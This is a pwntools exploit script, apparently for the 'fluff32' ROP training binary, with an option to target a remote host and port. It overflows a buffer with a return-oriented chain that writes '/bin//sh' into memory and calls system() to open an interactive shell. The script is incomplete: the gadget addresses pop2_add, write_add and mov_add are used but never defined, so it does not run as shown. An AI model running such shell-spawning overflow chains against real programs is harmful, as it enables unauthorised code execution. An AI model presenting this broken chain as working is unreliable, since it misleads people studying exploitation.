#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context.arch = 'i386'

local = 1

if local:
	cn = process('./fluff32')
	# bin = ELF('./task_shoppingCart',checksec=False)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	# libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)

else:
	cn = remote('117.78.27.105', 30403)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	pass


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()


system_add = 0x08048430
call_esi = 0x0804884b # call dword ptr [esi];


z('b*0x0804864A\nc')

payload = 'A'*0x28 + 'BBBB'
payload += p32(pop2_add) + p32(write_add) + '/bin' + p32(mov_add)
payload += p32(pop2_add) + p32(write_add+4) + '//sh' + p32(mov_add)

payload += p32(system_add) + p32(0) + p32(write_add)
cn.sendline(payload)

cn.interactive()
